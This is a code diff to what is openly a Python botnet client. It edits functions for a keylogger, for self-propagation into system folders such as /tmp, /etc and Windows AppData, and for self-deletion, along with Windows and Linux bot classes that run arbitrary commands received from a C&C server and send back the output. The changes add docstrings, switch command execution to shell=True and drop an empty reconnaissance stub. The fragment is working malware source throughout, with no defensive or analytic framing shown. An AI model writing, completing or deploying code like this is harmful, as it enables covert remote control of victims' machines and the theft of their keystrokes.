@@ -62,17 +62,22 @@ def self_delete():
 	if SYSTEM == 'Linux':
 		try:
 			'''
-			Delete all files from Linux system.
+			Delete all copies of this file from the Linux file
+			system.
 			'''
 			run(['rm', '/tmp/' + FILENAME])
 			run(['rm', '/etc/' + FILENAME])
 			run(['rm', '/tmp/' + FILENAME])
 			run(['rm', fullpath])
 		except:
-			return "Couldnt remove all files..."
-		return "Deleted all files..."
+			return r"Couldnt remove all files..."
+		return r"Deleted all files..."
 	else:
 		try:
+			'''
+			Delete all copies of this file from the Windows file
+			system.
+			'''
 			run(['del', r'%temp%\\' + FILENAME])
 			run(['del', r'C:\Users\%username%\\' + FILENAME])
 			run(['del', r'C:\Users\%username%\\AppData\\' + FILENAME])
@@ -96,8 +101,8 @@ def propagate(name: str):
 			run(['cp', name, '/etc'])
 			run(['cp', name, '/var'])
 		except:
-			return "Unable to propagate..."
-		return "File has been cloned to /tmp /etc and /var folders..."
+			return r"Unable to propagate..."
+		return r"File has been cloned to /tmp /etc and /var folders..."
 	else:
 		try:
 			run(['copy', name, r'%temp%'])
@@ -106,15 +111,6 @@ def propagate(name: str):
 		except:
 			return r"Unable to propagate..."	
 		return r"File has been cloned to temp, C:\Users\[current user]\, and AppData\..."
-
-def auto_recon():
-	"""This function will perform basic reconnaissance on the target machines.
-		Arguments:
-			None
-		Returns:
-			None
-	"""
-
 
 """ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
 
@@ -136,7 +132,12 @@ def on_press(key):
 			LOG += str(key)
 
 def log_to_file():
-	"""
+	"""This function will log collected keystrokes to a text file in the
+	/tmp folder.
+		Arguments:
+			None
+		Returns:
+			None
 	"""
 	f = open(DIRECTORY + 'log.txt', 'a+')
 	f.write(LOG)
@@ -144,10 +145,11 @@ def log_to_file():
 	cycle.start()
 
 def keylogger():
-	"""This function will start a keylogger in the background and will save its
-		contents to /tmp folder.
+	"""This function will start a keylogger in the background.
 		Arguments:
+			None
 		Returns:
+			None
 	"""
 	with keyboard.Listener(
 		onpress=on_press) as capturer:
@@ -221,7 +223,8 @@ class WindowsBot:
 		"""
 		DEVNULL = open(os.devnull, 'w') # Open devnull file to send stderr to.
 		try:
-			output = run(command.split(), # Run command.
+			output = run(command, # Run command.
+						shell=True, # Invoking a shell.
 						stdout=PIPE, # Pipe command to store in variable.
 						stderr=DEVNULL)	# Send standard error to devnull.
 			return output.stdout
@@ -255,8 +258,6 @@ class WindowsBot:
 						command_output = propagate(FILENAME)
 					elif command.strip() == 'destory':
 						command_output = self_delete()
-					elif command == 'autorecon':
-						command_output = auto_recon()
 					else:
 						command_output = self.exec_windows_cmd(command) # Execute command on machine and store the response.
 					sock.send(bytes(str(command_output), 'utf-8')) # Send the output to the C&C server.
@@ -316,8 +317,6 @@ class LinuxBot:
 						command_output = propagate(FILENAME)
 					elif command.strip() == 'destory':
 						command_output = self_delete()
-					elif command == 'autorecon':
-						command_output = auto_recon()
 					else:
 						command_output = self.exec_linux_cmd(command) # Execute command on machine and store the response.
 					sock.send(bytes(str(command_output), 'utf-8')) # Send the output to the C&C server.
